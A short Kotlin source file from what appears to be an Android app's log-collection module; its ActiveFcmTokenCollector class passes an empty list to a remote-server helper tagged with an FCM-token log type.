package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants

class ActiveFcmTokenCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi
) :LogsCollector {
    override fun uploadLogs() {
        val remoteServerHelper=RemoteServerHelper(context =context, logType = AppConstants.ACTIVE_FCM_TOKEN_TYPE, localDatabaseSource = localDatabaseSource, tosApi = tosApi)
        remoteServerHelper.upload(listOf<String>())
    }
}